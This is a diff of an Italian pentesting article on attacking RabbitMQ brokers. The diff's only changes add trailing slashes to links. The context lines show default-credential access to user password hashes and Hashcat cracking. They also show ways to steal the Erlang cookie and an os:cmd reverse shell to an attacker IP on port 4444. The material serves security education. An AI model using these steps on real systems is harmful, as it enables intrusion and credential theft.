@@ -47,7 +47,7 @@ Producer (app)          RabbitMQ                     Consumer (app)
 | **15672** | HTTP       | Management web UI + REST API                                             |
 | 4369      | EPMD       | Erlang Port Mapper (cluster)                                             |
 | 25672     | Erlang     | Distribuzione inter-nodo                                                 |
-| 15692     | HTTP       | [Prometheus](https://hackita.it/articoli/porta-9090-web-console) metrics |
+| 15692     | HTTP       | [Prometheus](https://hackita.it/articoli/porta-9090-web-console/) metrics |
 
 ## 1. Enumerazione
 
@@ -149,7 +149,7 @@ curl -s -u guest:guest http://10.10.10.40:15672/api/users | python3 -m json.tool
 ]
 ```
 
-Hash delle password di tutti gli utenti. Il formato RabbitMQ è SHA-256 con un salt di 4 byte prepended, codificato in base64. Per crackare con [Hashcat](https://hackita.it/articoli/hashcat):
+Hash delle password di tutti gli utenti. Il formato RabbitMQ è SHA-256 con un salt di 4 byte prepended, codificato in base64. Per crackare con [Hashcat](https://hackita.it/articoli/hashcat/):
 
 ```bash
 # Decodifica base64 → separa salt (primi 4 byte) e hash
@@ -259,9 +259,9 @@ docker exec <container> cat /var/lib/rabbitmq/.erlang.cookie
 Come lo ottieni?
 
 * **LFI** in un'altra applicazione sullo stesso server
-* **Backup esposti** ([Git](https://hackita.it/articoli/porta-9418-git), [NFS](https://hackita.it/articoli/porta-2049-nfs), [SMB](https://hackita.it/articoli/smb))
+* **Backup esposti** ([Git](https://hackita.it/articoli/porta-9418-git/), [NFS](https://hackita.it/articoli/porta-2049-nfs/), [SMB](https://hackita.it/articoli/smb/))
 * **Docker image inspection** — il cookie è spesso nel layer
-* **File read** tramite altra vulnerabilità ([Webmin](https://hackita.it/articoli/porta-10000-webmin), [Tomcat](https://hackita.it/articoli/porta-8080-tomcat) Ghostcat)
+* **File read** tramite altra vulnerabilità ([Webmin](https://hackita.it/articoli/porta-10000-webmin/), [Tomcat](https://hackita.it/articoli/porta-8080-tomcat/) Ghostcat)
 
 ### RCE con il cookie
 
@@ -286,7 +286,7 @@ erl -name attacker@10.10.10.200 -setcookie STOLENERLANGCOOKIEVALUE \
 (rabbit@prod-broker-01)3> os:cmd("bash -c 'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1'").
 ```
 
-RCE come utente `rabbitmq`. Per privilege escalation: [Linux Privilege Escalation](https://hackita.it/articoli/linux-privesc).
+RCE come utente `rabbitmq`. Per privilege escalation: [Linux Privilege Escalation](https://hackita.it/articoli/linux-privesc/).
 
 ```bash
 # Metasploit
@@ -362,7 +362,7 @@ Le CVE di RabbitMQ sono relativamente poche e a basso impatto — il vero vettor
 ## 10. Mini FAQ
 
 **`guest:guest` funziona ancora nel 2026?**
-Da localhost sì, è il comportamento di default. Da remoto, solo se qualcuno ha configurato `loopback_users = none` — cosa comunissima nei deploy Docker dove il container è raggiungibile dalla rete. La Docker official image ha una [nota specifica](https://hackita.it/articoli/docker-security) su questo comportamento.
+Da localhost sì, è il comportamento di default. Da remoto, solo se qualcuno ha configurato `loopback_users = none` — cosa comunissima nei deploy Docker dove il container è raggiungibile dalla rete. La Docker official image ha una [nota specifica](https://hackita.it/articoli/docker-security/) su questo comportamento.
 
 **Cos'è l'Erlang cookie e perché è così pericoloso?**
 È una stringa segreta condivisa tra i nodi Erlang di un cluster. Chi la possiede può connettersi come nodo fidato e usare `os:cmd()` per eseguire comandi arbitrari. È l'equivalente di una chiave SSH root per il mondo Erlang — un singolo file di testo che dà accesso completo.
